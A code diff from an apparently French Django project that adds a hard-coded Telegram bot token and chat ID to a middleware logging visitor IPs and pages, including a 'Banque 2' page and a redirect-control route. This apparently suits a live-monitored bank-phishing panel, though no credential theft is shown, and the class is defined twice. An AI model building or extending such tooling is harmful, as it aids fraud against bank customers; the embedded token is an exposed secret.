@@ -23,7 +23,6 @@ PAGES_DISPONIBLES = [
     ('/banque-2/',       'Banque 2'),
 ]
 
-
 import time
 import requests
 import threading
@@ -40,6 +39,9 @@ import requests
 import threading
 from django.core.cache import cache
 
+TIMEOUT_VISITEUR = 60
+TELEGRAM_TOKEN   = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
+TELEGRAM_CHAT_ID = "8849728706"
 
 
 def get_visiteurs():
@@ -80,6 +82,8 @@ class VisiteurTempsReelMiddleware:
                 'user_agent': request.META.get('HTTP_USER_AGENT', 'Inconnu'),
                 'methode':    request.method,
             }
+            set_visiteurs(visiteurs)
+            print(f">>> Visiteur sauvegardé en cache : {ip} → {request.path}")
             set_visiteurs(visiteurs)
 
         self._nettoyer()
@@ -224,6 +228,7 @@ class VisiteurTempsReelMiddleware:
         for ip in a_supprimer:
             del VISITEURS_ACTIFS[ip]
 
+
 class VisiteurTempsReelMiddleware:
 
     def __init__(self, get_response):
@@ -239,7 +244,7 @@ class VisiteurTempsReelMiddleware:
             return redirect(cible)
 
         # Enregistrer le visiteur (sauf pages de monitoring)
-        if not request.path.startswith('/visiteurs/'):
+        if not request.path.startswith('/visiteurs/') and request.path != '/verifier-redirection/':
             VISITEURS_ACTIFS[ip] = {
                 'page':       request.path,
                 'last_seen':  time.time(),
